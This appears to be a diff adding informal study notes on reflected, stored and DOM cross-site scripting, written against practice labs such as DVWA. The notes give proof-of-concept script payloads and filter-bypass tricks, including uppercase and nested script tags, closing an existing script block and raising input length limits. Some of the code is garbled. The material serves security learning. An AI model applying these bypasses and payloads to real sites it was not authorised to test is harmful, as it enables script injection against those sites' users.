@@ -1,0 +1,29 @@
+3type of xss
+1.]]]reflected XSS
+(temporary on website)
+got <pre></pre> filter put two to filter out
+<script>alert(window.location.hostname)</script>
+
+
+
+2.]]]stored XSS(dvwa xss stored)
+(no need open any link and save on the website even everytime refresh the page)
+<span id="thm-title"> </span>
+<script> document.query.Selector("#thm-title").textContent="i am hacka"</script> 
+bypass
+1.<SCRIPT> BIG LETTER
+2.<scr<script>ipt>
+<script>
+  document.getElementById("id").innerHTML="This password is for<script>alert()</script> -> so when we input alert is like this we need to inject </script><script>alert()</script>
+</script>
+3.test">/"}]}}; if got bracket also need to close the filter
+tips)
+if website got filter limit your input ->go inspect page find maxlength="10" change the 10 
+
+
+
+
+
+3.]]]DOM XSS (dvwa -owasp2013 -xss -dom injection)
+(attack payload executed ->modifying browser action to act in unexpected manner)
+
